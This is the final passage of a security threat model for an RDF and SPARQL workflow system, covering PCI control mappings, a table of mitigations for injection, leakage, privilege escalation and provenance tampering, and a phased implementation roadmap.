  - control: "Requirement 7 - Restrict access to cardholder data"
    implementation:
      - Class-level ACL on payment workflow specifications
      - Property-level redaction of payment data variables
      - Encrypted service endpoints (yawl:wsdlLocation)
    validation: "Penetration testing quarterly"

  - control: "Requirement 10 - Track and monitor all access"
    implementation:
      - Lockchain audit trail for all RDF operations
      - Real-time alerting on payment workflow modifications
      - Audit log retention: 90 days minimum
    validation: "Daily audit log review"
```

---

## 10. Conclusion

### 10.1 Critical Mitigations Summary

| Threat | Mitigation | Priority | Implementation Effort |
|--------|-----------|----------|---------------------|
| **SPARQL Injection** | Parameterized queries | CRITICAL | Medium (2 weeks) |
| **Ontology Injection** | Schema validation + Change approval | HIGH | High (4 weeks) |
| **Information Leakage** | Path-based access control | MEDIUM | Medium (3 weeks) |
| **Privilege Escalation** | Permission boundary enforcement | CRITICAL | Medium (2 weeks) |
| **Provenance Tampering** | Lockchain integration | HIGH | High (4 weeks) |

### 10.2 Implementation Roadmap

**Phase 1: Critical Defenses (Weeks 1-4)**
- [ ] Implement parameterized SPARQL queries
- [ ] Deploy SPARQL injection detection
- [ ] Enforce permission boundary checks
- [ ] Enable Lockchain audit trail

**Phase 2: Ontology Security (Weeks 5-8)**
- [ ] Implement schema validation
- [ ] Deploy change approval workflow
- [ ] Add workflow integrity verification
- [ ] Configure immutable core ontology

**Phase 3: Advanced Protection (Weeks 9-12)**
- [ ] Deploy path-based access control
- [ ] Implement property-level redaction
- [ ] Add service endpoint validation
- [ ] Complete SOX/PCI compliance mapping

**Phase 4: Monitoring & Response (Weeks 13-16)**
- [ ] Deploy continuous security monitoring
- [ ] Establish incident response procedures
- [ ] Conduct penetration testing
- [ ] Complete security documentation

---

**Document Status:** Implementation-Ready
**Next Steps:** Begin Phase 1 critical defenses
**Security Review Required:** Yes (before production deployment)
**Compliance Sign-Off Required:** Yes (SOX/PCI auditors)
